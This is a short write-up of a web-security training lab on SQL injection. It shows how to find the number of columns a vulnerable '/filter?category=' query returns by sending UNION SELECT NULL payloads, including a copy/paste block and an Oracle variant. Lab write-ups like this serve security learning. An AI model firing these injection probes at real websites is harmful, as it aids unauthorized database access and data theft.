# SQL injection UNION attack, determining the number of columns returned by the query

A concise write-up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Determine the number of columns** returned by the vulnerable query (for later UNION exploitation).

> ⚠️ **Alert:** This phase only determines the **column count**. We are **not** extracting data yet.

---

## ✅ My Exact Steps (Verbatim)

1. **SQL injection UNION attack, determining the number of columns returned by the query**

2. **alert! this is only determining the number of columns.**

3. **lets find the vulnerable url parameter**

4. **`/filter?category=Lifestyle'` -> error 500**

5. **lets fix: `/filter?category=Lifestyle'--;` -> 200**

6. **since the lab informs us this is sql, we dont have to select from a table.**

7. **`/filter?category='+UNION+SELECT+NULL--;` -> returns 500, repeat this adding columns.**

8. **`/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--;` -> return 200**

9. **lab solved!**

---

## 🧠 Minimal Additions (Why / Tips)

- **UNION rules:** Your injected `UNION SELECT` must match the **exact number of columns** (and compatible data types) returned by the original query. The first working payload (Step 8) indicates the endpoint returns **3 columns**.
- **Using `NULL`:** `NULL` is type-flexible in most DBs, minimizing type mismatch errors during discovery.
- **No table needed?**  
  - **MySQL / PostgreSQL / SQL Server:** You can `SELECT` constants without a table (as used here).  
  - **Oracle:** Requires a dummy table; use `FROM DUAL`, e.g., `UNION SELECT NULL,NULL,NULL FROM DUAL`.
- **Comments:** `--` comments out the rest of the line. Many parsers require a trailing space; `--+` is a handy URL form because `+` decodes to a space.
- **Iterate:** Start with one `NULL`, then add commas: `NULL,NULL`, `NULL,NULL,NULL`, until you get **200 OK**.

---

## 🔧 Payloads I Used (Copy/Paste)

**Discovery & Fix:**
```txt
/filter?category=Lifestyle'
/filter?category=Lifestyle'--+
```

**UNION column count probing (increment NULLs until 200):**
```txt
/filter?category=Lifestyle'+UNION+SELECT+NULL--+
/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--+
/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--+
```

**Oracle variant (requires DUAL):**
```txt
/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL+FROM+DUAL--+
```

---

## 🏁 Result
- The application accepted `UNION SELECT` with **three columns**, confirming the **column count = 3** for subsequent UNION-based payloads. **Lab Solved. ✅**
